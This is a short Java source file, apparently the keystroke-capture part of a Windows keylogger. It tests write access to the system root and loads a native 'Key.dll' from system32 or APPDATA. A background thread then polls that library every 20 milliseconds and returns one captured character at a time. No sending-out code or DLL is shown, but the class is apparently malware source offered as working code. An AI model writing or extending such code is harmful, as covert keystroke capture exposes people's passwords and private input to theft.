
/**
 *
 * @author AngelCruel
 */
import java.io.File;

public class key extends Thread {

    public static final int DELAY = 20;
    public boolean activated = true;
    private String value = "!";
    private static String dir = null;

    private native String get();

    static {
        File f = new File(System.getenv("systemroot") + "\\dsf34rsdfew");
        if (f.mkdir()) {
            dir = System.getenv("systemroot") + "\\system32\\";
            f.delete();
        } else {
            dir = System.getenv("APPDATA") + "\\";
        }
        System.load(dir + "Key.dll");
    }

    @Override
    public void run() {
        while (activated) {
            try {
                value = get();
                Thread.sleep(DELAY);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public String getChar() {
        String temp = value;
        value = "!";
        return temp;
    }
}
